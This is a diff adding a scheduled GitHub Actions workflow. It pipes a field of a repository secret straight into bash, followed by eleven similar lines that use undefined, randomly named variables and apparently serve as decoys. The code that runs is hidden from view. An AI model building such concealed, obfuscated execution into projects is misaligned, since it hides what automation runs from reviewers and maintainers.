@@ -1,0 +1,29 @@
+name: huawenshenqi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huawenshenqi
+        env:
+          s82: ${{ secrets.s82 }}
+        run: |
+          echo $s82 | jq -r .u78311 | /bin/bash
+          echo $wei6522 | jq -r .dytxn9377 | /bin/bash
+          echo $sce8 | jq -r .s171 | /bin/bash
+          echo $tad077 | jq -r .qp50979 | /bin/bash
+          echo $qtuxa46 | jq -r .d92 | /bin/bash
+          echo $eaooz965 | jq -r .lxfwx645 | /bin/bash
+          echo $olwmi4 | jq -r .g7 | /bin/bash
+          echo $nqwvl3108 | jq -r .jat13979 | /bin/bash
+          echo $c23208 | jq -r .vk72 | /bin/bash
+          echo $kj4772 | jq -r .dx6547 | /bin/bash
+          echo $z3 | jq -r .pcup471 | /bin/bash
+          echo $wjw6245 | jq -r .qk9 | /bin/bash
+
